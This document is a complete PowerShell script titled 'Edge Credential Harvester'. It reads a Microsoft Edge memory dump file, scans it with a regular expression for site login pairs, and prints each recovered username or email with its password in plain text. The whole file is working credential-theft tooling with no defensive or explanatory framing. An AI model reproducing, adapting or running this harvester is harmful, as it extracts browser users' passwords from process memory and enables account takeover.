$file = "edge_snapped.dmp"

Write-Host "`nEdge Credential Harvester" -ForegroundColor White
Write-Host "---------------------------" -ForegroundColor White

if (Test-Path $file) {
    $fileInfo = Get-Item $file
    $sizeText = [math]::Round($fileInfo.Length / 1GB, 2)
    
    Write-Host "[*] Status: Found target file '$file' " -NoNewline -ForegroundColor White
    Write-Host "($sizeText GB)" -ForegroundColor Yellow
    
    try {
        Write-Host "[*] Step 1: Mapping file into memory for fast scanning..." -ForegroundColor White
        $content = [System.IO.File]::ReadAllText($fileInfo.FullName, [System.Text.Encoding]::ASCII)
        Write-Host "[+] Step 1 Complete: Memory mapping successful." -ForegroundColor Green
        
        Write-Host "[*] Step 2: Running regex pattern analysis..." -ForegroundColor White
        
        $pattern = "comhttps\s+([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[a-zA-Z0-9._-]{3,30})\s+([^\s]{5,100})"
        $matches = [regex]::Matches($content, $pattern)
        Write-Host "[+] Step 2 Complete: Found $($matches.Count) potential matches." -ForegroundColor Green
        
        Write-Host "[*] Step 3: Filtering noise and deduplicating results..." -ForegroundColor White
        Write-Host "`n[#] EXTRACTION RESULTS [#]" -ForegroundColor White

        $finalSet = @{}

        foreach ($m in $matches) {
            $user = $m.Groups[1].Value.Trim()
            $pass = $m.Groups[2].Value.Trim()
            
            if ($user -notmatch "favicon|search|bing|google|yahoo|microsoft|msn|edge|adobe|protocol|service|UIAllow") {
                if ($pass -notmatch "http|202[0-9]") {
                    $key = "$user|$pass"
                    if (-not $finalSet.ContainsKey($key)) {
                        $finalSet[$key] = $true
                        
                        Write-Host "------------------------------------------"
                        Write-Host "Username/eMail:   " -NoNewline
                        Write-Host $user -ForegroundColor Red
                        
                        Write-Host "Password:         " -NoNewline
                        Write-Host $pass -ForegroundColor Red
                    }
                }
            }
        }
        Write-Host "------------------------------------------"

    } catch {
        Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "[!] Tip: Ensure you have enough free RAM to load the dump." -ForegroundColor Yellow
    }
} else {
    Write-Host "[-] Critical Error: File '$file' not found in current directory." -ForegroundColor Red
}

Write-Host "`n[*] Scan Complete. All tasks finished.`n" -ForegroundColor White
